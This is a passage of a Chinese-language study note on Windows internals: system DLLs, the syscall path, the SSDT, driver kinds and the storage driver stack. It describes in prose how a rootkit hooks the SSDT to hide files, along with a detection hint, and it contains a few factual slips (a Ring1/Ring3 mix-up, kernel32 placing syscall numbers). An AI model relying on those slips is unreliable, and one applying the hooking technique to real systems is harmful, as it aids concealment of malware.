&lt;h4 id=&#34;user32dll&#34;&gt;user32.dll
&lt;/h4&gt;&lt;p&gt;负责所有用户图形界面（GUI）的功能设计，如窗口、菜单、按钮、鼠标和键盘输入等，即&lt;strong&gt;结构和交互&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在早期32-bit 版本的Windows中，用户控件是在&lt;code&gt;ComCtl32&lt;/code&gt;中实现的，但是一些控件的显示功能是在&lt;code&gt;User32.dll&lt;/code&gt;中实现的，例如在一个窗口中非客户区域（边框和菜单）的绘制就是由&lt;code&gt;User32.dll&lt;/code&gt;来完成的&lt;/p&gt;
&lt;p&gt;&lt;code&gt;User32.dll&lt;/code&gt;是操作系统的一个核心控件，它和操作系统是紧密联系在一起的，不同版本的Windows中&lt;code&gt;User32.dll&lt;/code&gt;是不同，因此，应用程序在不同版本的Windows中运行的时候，由于&lt;code&gt;User32.dll&lt;/code&gt;的不同，会导致应用程序的界面通常会有微小的不同&lt;/p&gt;
&lt;h4 id=&#34;gdi32dll&#34;&gt;gdi32.dll
&lt;/h4&gt;&lt;p&gt;负责图形化窗口的图形绘制与内容输出，包括像素、线条、字体、位图、画刷等，即&lt;strong&gt;内容和外观&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;comdlg32dll&#34;&gt;comdlg32.dll
&lt;/h4&gt;&lt;p&gt;通用对话框库（Common Dialog Box Library），这个库为应用程序提供了标准的、预制好的对话框，比如常见的“打开文件”、“保存文件”和“打印”等窗口&lt;/p&gt;
&lt;p&gt;当&lt;code&gt;user32.dll&lt;/code&gt;需要一个“打开文件”对话框时，它不去自己一点点造，而是直接从&lt;code&gt;comdlg32.dll&lt;/code&gt;这里拿一个现成的、标准化的来用&lt;/p&gt;
&lt;h4 id=&#34;advapi32dll&#34;&gt;advapi32.dll
&lt;/h4&gt;&lt;p&gt;高级Windows32位应用程序接口，负责处理注册表操作、系统服务管理、账户和安全相关的函数&lt;/p&gt;
&lt;h3 id=&#34;网络通信库-判断网络行为的关键&#34;&gt;网络通信库 (判断网络行为的关键)
&lt;/h3&gt;&lt;h4 id=&#34;ws2_32dll--wsock32dll&#34;&gt;ws2_32.dll / wsock32.dll
&lt;/h4&gt;&lt;p&gt;Windows Sockets（套接字）库，是所有 TCP/IP 网络编程的基础&lt;/p&gt;
&lt;p&gt;这是一个最重要的网络行为指标&lt;/p&gt;
&lt;h4 id=&#34;wininetdll&#34;&gt;wininet.dll
&lt;/h4&gt;&lt;p&gt;更高层的互联网协议库，封装了 HTTP、HTTPS 和 FTP 等协议，让程序能更方便地访问网页和传输文件。&lt;/p&gt;
&lt;h4 id=&#34;dnsapidll&#34;&gt;dnsapi.dll
&lt;/h4&gt;&lt;p&gt;负责进行 DNS 域名解析，即将网址（如 &lt;code&gt;www.google.com&lt;/code&gt;）转换为 IP 地址&lt;/p&gt;
&lt;h3 id=&#34;脚本与执行相关库&#34;&gt;脚本与执行相关库
&lt;/h3&gt;&lt;h4 id=&#34;shell32dll&#34;&gt;shell32.dll
&lt;/h4&gt;&lt;p&gt;提供了核心的 Windows Shell（外壳）功能，如打开文件、显示属性、处理快捷方式等&lt;/p&gt;
&lt;h4 id=&#34;ole32dll--oleaut32dll&#34;&gt;ole32.dll / oleaut32.dll
&lt;/h4&gt;&lt;p&gt;负责处理 OLE（对象链接与嵌入）和 COM（组件对象模型）技术&lt;/p&gt;
&lt;p&gt;Office 宏病毒和许多漏洞利用（如利用文档中嵌入的恶意对象）都严重依赖这两个库的功能&lt;/p&gt;
&lt;h4 id=&#34;jscriptdll--vbscriptdll&#34;&gt;jscript.dll / vbscript.dll
&lt;/h4&gt;&lt;p&gt;分别用于解析和执行 JScript 和 VBScript 脚本的引擎&lt;/p&gt;
&lt;p&gt;当&lt;code&gt;wscript.exe&lt;/code&gt;或&lt;code&gt;mshta.exe&lt;/code&gt;等脚本执行进程加载它们时，表明有相应的脚本正在运行&lt;/p&gt;
&lt;h1 id=&#34;系统调用&#34;&gt;系统调用
&lt;/h1&gt;&lt;h2 id=&#34;什么是系统调用&#34;&gt;什么是系统调用
&lt;/h2&gt;&lt;p&gt;系统调用是运行在用户模式 (UserMode/Ring3) 的应用程序，向操作系统内核 (KernelMode / Ring0) 请求服务或资源的唯一、规范化的接口&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这是操作系统为了保护自身稳定性和安全性而设定的核心机制&lt;/strong&gt;，应用程序不能随心所欲地直接访问硬件或关键内存，所有这些敏感操作都必须通过系统调用，以一种受控的方式“委托”给内核来完成&lt;/p&gt;
&lt;h2 id=&#34;系统调用工作过程&#34;&gt;系统调用工作过程
&lt;/h2&gt;&lt;h3 id=&#34;准备阶段&#34;&gt;准备阶段
&lt;/h3&gt;&lt;p&gt;用户模式的应用程序（例如&lt;code&gt;notepad.exe&lt;/code&gt;）准备调用一个Win32API函数，比如 &lt;code&gt;WriteFile&lt;/code&gt;，&lt;code&gt;WriteFile&lt;/code&gt; 函数本身位于&lt;code&gt;kernel32.dll&lt;/code&gt;中&lt;/p&gt;
&lt;h3 id=&#34;中介阶段&#34;&gt;中介阶段
&lt;/h3&gt;&lt;p&gt;&lt;code&gt;kernel32.dll&lt;/code&gt;中的&lt;code&gt;WriteFile&lt;/code&gt;函数并不会直接执行写文件操作，它是一个包装函数&lt;/p&gt;
&lt;p&gt;它会把真正的写文件操作对应的系统调用编号（比如写文件的&lt;code&gt;NtWriteFile&lt;/code&gt; 的编号）放入CPU的&lt;code&gt;EAX&lt;/code&gt;寄存器中，并将其他参数（如文件句柄、数据缓冲区等）放入其他指定的寄存器&lt;/p&gt;
&lt;h3 id=&#34;切换阶段&#34;&gt;切换阶段
&lt;/h3&gt;&lt;p&gt;准备好之后，&lt;code&gt;ntdll.dll&lt;/code&gt;中的代码会执行一条特殊的CPU指令，例如&lt;code&gt;SYSCALL&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;特权级转换&#34;&gt;特权级转换
&lt;/h3&gt;&lt;p&gt;&lt;code&gt;SYSCALL&lt;/code&gt;指令会使CPU立即从用户模式切换到内核模式，并将控制权交给内核中一个预设好的系统调用总处理程序&lt;/p&gt;
&lt;h3 id=&#34;派阶段&#34;&gt;派阶段
&lt;/h3&gt;&lt;p&gt;内核的总处理程序接管控制权后，会查看&lt;code&gt;EAX&lt;/code&gt;寄存器中的系统调用编号，然后利用这个编号去&lt;strong&gt;SSDT&lt;/strong&gt;中查找对应的内核函数地址&lt;/p&gt;
&lt;h3 id=&#34;执行阶段&#34;&gt;执行阶段
&lt;/h3&gt;&lt;p&gt;找到地址后，内核会跳转到该地址（例如内核中的&lt;code&gt;NtWriteFile&lt;/code&gt;函数）去执行真正的文件写入操作&lt;/p&gt;
&lt;h3 id=&#34;返回阶段&#34;&gt;返回阶段
&lt;/h3&gt;&lt;p&gt;内核函数执行完毕后，会将结果返回，CPU 再从内核模式切换回用户模式，应用程序继续执行&lt;/p&gt;
&lt;h2 id=&#34;ssdt&#34;&gt;SSDT
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;SSDT 的全称是System Service Dispatch Table（系统服务分派表）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;它就是我们在上面流程中提到的那个函数地址查询表，它是一个存放在内核内存中的数组，数组的每一个元素都是一个函数指针，指向了实现具体系统调用的内核函数的内存地址&lt;/p&gt;
&lt;p&gt;当系统调用发生时，内核就是通过&lt;code&gt;系统调用编号&lt;/code&gt;作为索引，在这个 SSDT 数组中找到并调用正确的内核函数&lt;/p&gt;
&lt;h2 id=&#34;ssdthook&#34;&gt;SSDThook
&lt;/h2&gt;&lt;p&gt;由于 SSDT 是所有关键操作的必经之路，它成为了内核级 Rootkit 的首要攻击目标&lt;/p&gt;
&lt;p&gt;Rootkit（通常是一个恶意的&lt;code&gt;.sys&lt;/code&gt;驱动）会获取到 SSDT 在内存中的地址，然后用自己的恶意函数地址，去覆盖表中某个正常系统函数的地址&lt;/p&gt;
&lt;p&gt;比如一个文件隐藏Rootkit，可能会用自己的&lt;code&gt;HookedNtQueryDirectoryFile&lt;/code&gt;函数地址，替换掉SSDT中原始的 &lt;code&gt;NtQueryDirectoryFile&lt;/code&gt;（用于列出目录内容）的地址&lt;/p&gt;
&lt;p&gt;此后，当任何程序（包括 &lt;code&gt;explorer.exe&lt;/code&gt;）尝试列出目录内容时，系统调用都会被重定向到这个恶意的 &lt;code&gt;HookedNtQueryDirectoryFile&lt;/code&gt;函数这个恶意函数会先获取原始的目录列表，然后将其中所有与Rootkit自身相关的恶意文件名都过滤掉，最后再将一个“干净”的列表返回给应用程序，这样，用户就永远无法看到这些恶意文件了&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果一个函数的地址指向的不是官方的 &lt;code&gt;ntoskrnl.exe&lt;/code&gt; (或 &lt;code&gt;win32k.sys&lt;/code&gt;)，而是指向了一个第三方的、可疑的驱动文件，那么就意味着SSDT已被劫持&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;系统用的分类&#34;&gt;系统用的分类
&lt;/h2&gt;&lt;h3 id=&#34;进程与线程管理&#34;&gt;进程与线程管理
&lt;/h3&gt;&lt;h4 id=&#34;ntcreateprocess&#34;&gt;NtCreateProcess
&lt;/h4&gt;&lt;p&gt;创建一个新进程&lt;/p&gt;
&lt;h4 id=&#34;ntterminateprocess&#34;&gt;NtTerminateProcess
&lt;/h4&gt;&lt;p&gt;终止一个进程&lt;/p&gt;
&lt;h4 id=&#34;ntcreatethread&#34;&gt;NtCreateThread
&lt;/h4&gt;&lt;p&gt;创建一个新线程&lt;/p&gt;
&lt;h4 id=&#34;ntopenprocess&#34;&gt;NtOpenProcess
&lt;/h4&gt;&lt;p&gt;打开一个已存在进程的句柄&lt;/p&gt;
&lt;h3 id=&#34;文件与-io-操作&#34;&gt;文件与 I/O 操作
&lt;/h3&gt;&lt;h4 id=&#34;ntcreatefile&#34;&gt;NtCreateFile
&lt;/h4&gt;&lt;p&gt;创建或打开一个文件&lt;/p&gt;
&lt;h4 id=&#34;ntreadfile&#34;&gt;NtReadFile
&lt;/h4&gt;&lt;p&gt;从文件中读取数据&lt;/p&gt;
&lt;h4 id=&#34;ntwritefile&#34;&gt;NtWriteFile
&lt;/h4&gt;&lt;p&gt;向文件中写入数据&lt;/p&gt;
&lt;h4 id=&#34;ntdeviceiocontrolfile&#34;&gt;NtDeviceIoControlFile
&lt;/h4&gt;&lt;p&gt;向设备驱动发送控制命令&lt;/p&gt;
&lt;h3 id=&#34;注册表操作&#34;&gt;注册表操作
&lt;/h3&gt;&lt;h4 id=&#34;ntopenkey&#34;&gt;NtOpenKey
&lt;/h4&gt;&lt;p&gt;打开一个注册表项&lt;/p&gt;
&lt;h4 id=&#34;ntqueryvaluekey&#34;&gt;NtQueryValueKey
&lt;/h4&gt;&lt;p&gt;查询一个注册表键值的数据&lt;/p&gt;
&lt;h4 id=&#34;ntsetvaluekey&#34;&gt;NtSetValueKey
&lt;/h4&gt;&lt;p&gt;设置一个注册表键值的数据&lt;/p&gt;
&lt;h3 id=&#34;内存管理&#34;&gt;内存管理
&lt;/h3&gt;&lt;h4 id=&#34;ntallocatevirtualmemory&#34;&gt;NtAllocateVirtualMemory
&lt;/h4&gt;&lt;p&gt;在进程的虚拟地址空间中分配内存&lt;/p&gt;
&lt;h4 id=&#34;ntprotectvirtualmemory&#34;&gt;NtProtectVirtualMemory
&lt;/h4&gt;&lt;p&gt;修改内存页的保护属性（如可读、可写、可执行）&lt;/p&gt;
&lt;h1 id=&#34;驱动&#34;&gt;驱动
&lt;/h1&gt;&lt;h2 id=&#34;什么是驱动&#34;&gt;什么是驱动
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;驱动程序（Driver）是一个软件组件，它充当了操作系统内核与物理硬件或虚拟设备之间的通信桥梁&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当应用程序需要与硬件（如打印机、网卡、磁盘）交互时，它会向操作系统发出一个通用请求&lt;/p&gt;
&lt;p&gt;操作系统内核的I/O管理器接收到这个请求后，不会直接与硬件对话，而是将请求打包成&lt;strong&gt;IRP请求&lt;/strong&gt;转发给相应的驱动程序&lt;/p&gt;
&lt;p&gt;驱动程序负责将这个标准化的请求翻译成硬件能够理解的特定指令，并与硬件通信&lt;/p&gt;
&lt;h2 id=&#34;cpu的特权级别&#34;&gt;CPU的特权级别
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;在了解驱动文件之前，我们得先知道x86架构CPU的四个特权级别&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;特权级别在x86架构中也被称为保护环（Protection Rings），是CPU硬件层面实现的一种访问控制机制&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;x86架构定义了四个特权级别，从Ring0到Ring3，数字越小，代表权限越高&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;ring-0-内核态kernel-mode&#34;&gt;Ring 0: 内核态（Kernel Mode）
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;权限：最高&lt;/strong&gt;。运行在Ring0的代码可以执行 CPU 的所有指令集，并能直接访问任何内存地址、I/O端口和硬件设备&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;运行实体: 操作系统内核本身&lt;/strong&gt;。例如&lt;code&gt;ntoskrnl.exe&lt;/code&gt;和绝大多数设备驱动程序(&lt;code&gt;.sys&lt;/code&gt; 文件)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;这是操作系统的核心，负责管理系统所有资源，包括进程调度、内存管理、I/O 控制等&lt;/p&gt;
&lt;p&gt;如果Ring0的代码崩溃，整个系统将立即蓝屏（BSOD）或宕机（Kernel Panic）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ring-1--ring-2-准核心态驱动层rarely-used&#34;&gt;Ring 1 &amp;amp; Ring 2: 准核心态/驱动层（Rarely Used）
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;权限：介于内核态和用户态之间&lt;/strong&gt;。它们拥有比Ring3更高的权限（例如可以访问更多的 I/O 端口），但又不像Ring0那样拥有对系统的完全控制权&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;运行实体&lt;/strong&gt;: 在理论设计上，Ring1可以用于运行一些准系统级的服务，而Ring2可以用于运行设备驱动程序，从而将驱动与最核心的内核隔离开，增加系统的稳定性（即驱动崩溃不至于让整个内核崩溃）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;它几乎从未被主流消费级和服务器级操作系统（如 Windows, Linux, macOS）所使用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这些操作系统普遍采用了更简单的两级模型，即只使用Ring0和Ring3&lt;/p&gt;
&lt;p&gt;这是因为在Ring1/2和Ring0之间切换上下文的开销，以及复杂的内存管理，并没有带来足够的安全收益来抵消其复杂性&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ring-3-用户态user-mode&#34;&gt;Ring 3: 用户态（User Mode）
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;权限&lt;/strong&gt;：&lt;strong&gt;最低&lt;/strong&gt;。运行在Ring3的代码受到硬件的严格限制，它不能直接访问硬件，也不能访问属于内核或其他进程的受保护内存空间&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;运行实体&lt;/strong&gt;：&lt;strong&gt;所有的应用程序&lt;/strong&gt;。例如浏览器 、记事本、游戏等，都运行在Ring3&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;这是应用程序的沙箱，当一个Ring3的程序需要执行特权操作时（如读取文件），它不能直接去操作硬盘，而是必须通过一个名为系统调用的受控入口，向Ring0的内核提出请求&lt;/p&gt;
&lt;p&gt;内核会对请求进行验证，然后以Ring0的权限代为执行，再将结果返回给Ring1的程序&lt;/p&gt;
&lt;p&gt;这个过程确保了所有对关键资源的访问都在内核的掌控之下&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;驱动的文件形式&#34;&gt;驱动的文件形式
&lt;/h2&gt;&lt;h3 id=&#34;sys文件&#34;&gt;.sys文件
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;这是最传统、最核心、权限最高的驱动程序形式，是真正的驱动&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;它们是专门为在操作系统内核（Ring0）中运行而编译的，可以直接与硬件和内核数据结构交互&lt;/p&gt;
&lt;p&gt;几乎所有核心的硬件驱动，如磁盘驱动&lt;code&gt;ntfs.sys&lt;/code&gt;、网络驱动&lt;code&gt;tcpip.sys&lt;/code&gt;等，都是&lt;code&gt;.sys&lt;/code&gt;文件&lt;/p&gt;
&lt;h3 id=&#34;dll文件&#34;&gt;.dll文件
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;它们有的情况下是驱动组件，但大多数不是传统驱动&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;为了提高系统的稳定性和安全性，微软引入了用户模式驱动框架 (User-Mode Driver Framework, UMDF)&lt;/p&gt;
&lt;p&gt;一些对性能要求不是极致、但对稳定性要求很高的设备（如扫描仪、打印机、传感器等）的驱动，可以被实现为DLL文件&lt;/p&gt;
&lt;p&gt;这些驱动DLL运行在权限受限的用户模式（Ring3），并由一个系统进程（通常是&lt;code&gt;svchost.exe&lt;/code&gt;）作为“宿主”来加载和运行&lt;/p&gt;
&lt;h2 id=&#34;驱动程序的分类&#34;&gt;驱动程序的分类
&lt;/h2&gt;&lt;h3 id=&#34;按运行模式分类&#34;&gt;按运行模式分类
&lt;/h3&gt;&lt;h4 id=&#34;内核模式驱动程序&#34;&gt;内核模式驱动程序
&lt;/h4&gt;&lt;p&gt;这是最常见的类型，运行在操作系统的核心层 (Ring 0)，拥有最高权限&lt;/p&gt;
&lt;p&gt;它们可以直接与硬件通信，是系统运行的基石&lt;/p&gt;
&lt;h4 id=&#34;用户模式驱动程序&#34;&gt;用户模式驱动程序
&lt;/h4&gt;&lt;p&gt;运行在权限受限的用户模式 (Ring3) 下，安全性更高&lt;/p&gt;
&lt;p&gt;如果这类驱动程序崩溃，不会导致整个系统蓝屏&lt;/p&gt;
&lt;h3 id=&#34;按功能层次分类&#34;&gt;按功能层次分类
&lt;/h3&gt;&lt;h4 id=&#34;总线驱动程序&#34;&gt;总线驱动程序
&lt;/h4&gt;&lt;p&gt;位于驱动栈的最底层，负责枚举挂载在总线（如 PCI, USB）上的所有设备&lt;/p&gt;
&lt;h4 id=&#34;功能驱动程序&#34;&gt;功能驱动程序
&lt;/h4&gt;&lt;p&gt;驱动栈的核心，通常由硬件厂商编写，负责实现设备的具体I/O功能&lt;/p&gt;
&lt;h4 id=&#34;筛选驱动程序&#34;&gt;筛选驱动程序
&lt;/h4&gt;&lt;p&gt;可以附加在功能驱动程序之上或之下，用于“过滤”或“修改”流经该设备的 I/O 请求&lt;/p&gt;
&lt;p&gt;杀毒软件的文件实时监控、磁盘加密软件等，通常就是通过它来实现的&lt;/p&gt;
&lt;h2 id=&#34;常见的核心系统驱动&#34;&gt;常见的核心系统驱动
&lt;/h2&gt;&lt;h3 id=&#34;内核核心模块&#34;&gt;内核核心模块
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;不是传统驱动，但居于内核中心&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;ntoskrnlexe&#34;&gt;ntoskrnl.exe
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;它是操作系统内核本身，是所有内核活动的核心&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;可以把它理解为&lt;strong&gt;驱动管理器&lt;/strong&gt;和&lt;strong&gt;最根本的驱动&lt;/strong&gt;，虽然它实际上并非严格意义上的设备驱动&lt;/p&gt;
&lt;p&gt;在系统启动时，&lt;code&gt;ntoskrnl.exe&lt;/code&gt;会加载一系列其它核心模块（DLL 和 SYS）：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;hal.dll&lt;/code&gt;：硬件抽象层（HAL）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;kdcom.dll&lt;/code&gt;：内核调试通信&lt;/li&gt;
&lt;li&gt;&lt;code&gt;bootvid.dll&lt;/code&gt;、&lt;code&gt;ci.dll&lt;/code&gt;：安全校验、驱动签名&lt;/li&gt;
&lt;li&gt;各类驱动程序：&lt;code&gt;acpi.sys&lt;/code&gt;、&lt;code&gt;tcpip.sys&lt;/code&gt;、&lt;code&gt;disk.sys&lt;/code&gt;等&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;它是整个内核态模块的中枢，所有其他的驱动程序都需要在它提供的框架内运行，并由它来管理和调度&lt;/p&gt;
&lt;h3 id=&#34;内核支持模块&#34;&gt;内核支持模块
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;DLL类内核组件，没有设备对象，也不处理IRP，不是传统驱动，但运行在内核态，是 OS 的底层模块&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;haldll&#34;&gt;hal.dll
&lt;/h4&gt;&lt;p&gt;硬件抽象层，屏蔽不同主板和 CPU 的差异，为内核提供统一接口&lt;/p&gt;
&lt;h4 id=&#34;kdcomdll&#34;&gt;kdcom.dll
&lt;/h4&gt;&lt;p&gt;内核调试通信模块，用于系统调试时与调试器通信&lt;/p&gt;
&lt;h4 id=&#34;cidll&#34;&gt;ci.dll
&lt;/h4&gt;&lt;p&gt;负责代码完整性校验与驱动签名验证&lt;/p&gt;
&lt;h4 id=&#34;bootviddll&#34;&gt;bootvid.dll
&lt;/h4&gt;&lt;p&gt;开机阶段的简易显示输出，属于引导组件&lt;/p&gt;
&lt;h3 id=&#34;内核设备驱动程序&#34;&gt;内核设备驱动程序
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;是真正严格意义上的驱动&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;tcpipsys&#34;&gt;tcpip.sys
&lt;/h4&gt;&lt;p&gt;负责TCP/IP协议栈的核心驱动，处理所有网络数据包的收发。属于网络类驱动的代表&lt;/p&gt;
&lt;h4 id=&#34;ntfssys&#34;&gt;ntfs.sys
&lt;/h4&gt;&lt;p&gt;NTFS 文件系统的核心驱动，负责硬盘上所有文件的读写和管理&lt;/p&gt;
&lt;p&gt;它实现了文件系统层的功能，如读写文件、挂载卷等&lt;/p&gt;
&lt;h4 id=&#34;acpisys&#34;&gt;acpi.sys
&lt;/h4&gt;&lt;p&gt;负责高级配置与电源管理接口（ACPI），处理系统电源管理事件，如休眠、唤醒、电源按钮等&lt;/p&gt;
&lt;p&gt;它属于系统级别的 ACPI 驱动&lt;/p&gt;
&lt;h4 id=&#34;partmgrsys&#34;&gt;partmgr.sys
&lt;/h4&gt;&lt;p&gt;管理磁盘的分区结构&lt;/p&gt;
&lt;h4 id=&#34;storportsys&#34;&gt;storport.sys
&lt;/h4&gt;&lt;p&gt;提供与存储控制器（如 SATA、SCSI 控制器）之间的通信通道&lt;/p&gt;
&lt;h4 id=&#34;disksys&#34;&gt;disk.sys
&lt;/h4&gt;&lt;p&gt;硬盘设备驱动，处理底层磁盘I/O请求&lt;/p&gt;
&lt;p&gt;它与&lt;code&gt;partmgr.sys&lt;/code&gt;、&lt;code&gt;storport.sys&lt;/code&gt;等共同构建块设备访问层&lt;/p&gt;
&lt;h3 id=&#34;输入与图形类驱动&#34;&gt;输入与图形类驱动
&lt;/h3&gt;&lt;h4 id=&#34;kbdclasssysmouclasssys&#34;&gt;kbdclass.sys/mouclass.sys
&lt;/h4&gt;&lt;p&gt;键盘和鼠标的类驱动程序，负责处理来自这些输入设备的通用请求&lt;/p&gt;
&lt;p&gt;它不直接与硬件通信，而是接收底层端口驱动（如&lt;code&gt;i8042prt.sys&lt;/code&gt;）上传的输入数据&lt;/p&gt;
&lt;h4 id=&#34;dxgkrnlsys&#34;&gt;dxgkrnl.sys
&lt;/h4&gt;&lt;p&gt;DirectX图形内核驱动，是Windows显示驱动模型（WDDM）的核心，负责与GPU交互、调度图形任务&lt;/p&gt;
&lt;h3 id=&#34;驱动开发支持框架模块&#34;&gt;驱动开发支持框架模块
&lt;/h3&gt;&lt;h4 id=&#34;wdf01000sys&#34;&gt;Wdf01000.sys
&lt;/h4&gt;&lt;p&gt;Windows驱动程序框架（WDF）的一部分，是KMDF驱动的运行时组件，为许多现代驱动提供了统一的驱动模型支持&lt;/p&gt;
&lt;h4 id=&#34;wdfldrsys&#34;&gt;WdfLdr.sys
&lt;/h4&gt;&lt;p&gt;WDF加载器，负责驱动初始化&lt;/p&gt;
&lt;h4 id=&#34;winusbsys&#34;&gt;WinUsb.sys
&lt;/h4&gt;&lt;p&gt;WDF提供的USB驱动支持&lt;/p&gt;
&lt;h2 id=&#34;驱动栈&#34;&gt;驱动栈
&lt;/h2&gt;&lt;h3 id=&#34;什么是驱动栈&#34;&gt;什么是驱动栈
&lt;/h3&gt;&lt;p&gt;当用户在用户层发出一个文件读写请求时，比如&lt;code&gt;ReadFile(&amp;quot;D:\\example.txt&amp;quot;)&lt;/code&gt;，这个请求并不是直接送到硬盘，而是要经过多个驱动程序处理，每个驱动做自己的那一部分&lt;/p&gt;
&lt;p&gt;这种结构就叫驱动栈&lt;/p&gt;
&lt;h3 id=&#34;驱动栈的结构&#34;&gt;驱动栈的结构
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;下面是一个典型的Windows 存储驱动栈：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ntfs.sys（文件系统驱动）         ← 顶层（用户文件访问）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ↑
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;volmgr.sys（卷管理器驱动）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ↑
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;partmgr.sys（分区管理器驱动）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ↑
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;disk.sys（磁盘驱动）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ↑
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;storport.sys（存储端口驱动）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ↑
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Miniport Driver（存储控制器驱动） ← 底层（控制硬件）
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;驱动栈工作过程&#34;&gt;驱动栈工作过程
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;应用程序发起 I/O 请求&lt;/strong&gt;
用户程序调用&lt;code&gt;ReadFile()&lt;/code&gt;或&lt;code&gt;WriteFile()&lt;/code&gt;等API，也就是进行了涉及请求访问硬件或设备的系统调用&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;文件系统驱动处理&lt;/strong&gt;
&lt;code&gt;ntfs.sys&lt;/code&gt;解析文件路径、权限等，将文件操作转换为卷层面的块设备请求&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;卷管理器驱动处理&lt;/strong&gt;
&lt;code&gt;volmgr.sys&lt;/code&gt;管理逻辑卷，确定具体的物理磁盘分区&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;分区管理器驱动处理&lt;/strong&gt;
&lt;code&gt;partmgr.sys&lt;/code&gt;负责管理磁盘分区表，转发请求到正确的物理分区&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;磁盘驱动处理&lt;/strong&gt;
&lt;code&gt;disk.sys&lt;/code&gt;负责和物理磁盘设备交互，生成适合硬件的请求&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;存储端口驱动处理&lt;/strong&gt;
&lt;code&gt;storport.sys&lt;/code&gt;是与存储控制器通信的中间层，负责协议和请求队列管理&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;迷你端口驱动处理&lt;/strong&gt;
由硬件厂商编写，具体实现与存储控制器硬件的交互&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;硬件执行请求&lt;/strong&gt;
最终请求被硬件执行，数据被读写&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这个过程中，每一层都可以&lt;strong&gt;处理请求、修改请求、拦截请求&lt;/strong&gt;，层层检查&lt;/p&gt;
&lt;h3 id=&#34;其它类型的驱动栈&#34;&gt;其它类型的驱动栈
&lt;/h3&gt;&lt;p&gt;除了存储，还有很多其他的驱动栈：&lt;/p&gt;
&lt;h4 id=&#34;usb-驱动栈简化&#34;&gt;USB 驱动栈（简化）：
